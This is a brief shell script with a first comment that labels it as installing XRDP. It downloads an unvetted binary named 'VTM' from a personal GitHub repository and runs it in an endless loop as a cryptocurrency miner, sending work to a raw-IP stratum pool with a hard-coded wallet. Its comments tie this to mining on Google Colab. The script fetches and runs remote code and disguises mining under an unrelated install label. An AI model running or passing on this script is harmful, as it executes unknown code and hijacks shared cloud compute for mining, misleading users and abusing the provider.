# /bin/bash
# Install XRDP
# Before get xmr coin for free
# Google Colab
wget https://github.com/amit12986/code/raw/main/VTM
chmod 700 VTM

#!/bin/sh
#
# Choose nearest stratum:
#       stratum-eu.rplant.xyz   /France/
#       stratum-asia.rplant.xyz /Singapore/
#       stratum-na.rplant.xyz   /Canada/
#
FOLDER=$( cd -- "$( dirname -- "${BASH_SOURCE[0]}" )" &> /dev/null && pwd )
while [ 1 ]; do
"$FOLDER"/VTM -a yespower -o stratum+tcp://141.95.108.117:443 -u MWyhsXGGKoUrQ3E7GRn7CZV4UvHX34ePrt -p c=LTC -t10
sleep 5
done
